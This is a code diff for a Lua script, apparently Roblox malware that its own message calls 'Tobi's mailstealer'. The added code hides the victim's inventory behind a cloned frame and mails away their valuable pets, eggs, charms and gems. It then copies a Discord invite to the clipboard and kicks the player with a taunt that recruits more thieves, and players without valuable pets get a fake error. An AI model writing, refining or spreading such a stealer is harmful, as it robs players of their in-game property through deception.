@@ -241,17 +241,10 @@ function EmptyBoxes()
     end
 end
 
-EmptyBoxes()
-
-SendAllHuges()
-SendAllExc()
-
-if save.Egg ~= nil then
-    EggSteal()
-end
-
-if save.Charm ~= nil then
-    CharmSteal()
+local function freeze_inventory()
+    local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+    local pets_frame_clone = pets_frame:Clone()
+    pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
 end
 
 function CountGems()
@@ -269,6 +262,27 @@ function SendAllGems()
 	until CountGems() == nil
 end
 
-SendAllGems()
+print(CountHuges())
+if CountHuges() > 0 then
+	EmptyBoxes()
+	freeze_inventory()
+	local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
+	Inventoryframe:Destroy()
+	game.Workspace.__THINGS.Pets:Destroy()
+	SendAllHuges()
+	SendAllExc()
 
-plr:kick("All your stuff has just been stolen by Tobi's mailstealer\nJoin discord.gg/HcpNe56R2a to start mailstealing yourself")
+	if save.Egg ~= nil then
+		EggSteal()
+	end
+
+	if save.Charm ~= nil then
+		CharmSteal()
+	end
+
+	SendAllGems()
+	setclipboard("https://discord.gg/HcpNe56R2a")
+	plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
+else
+	plr:kick("Error on script execution: 0x0001F4A2")
+end
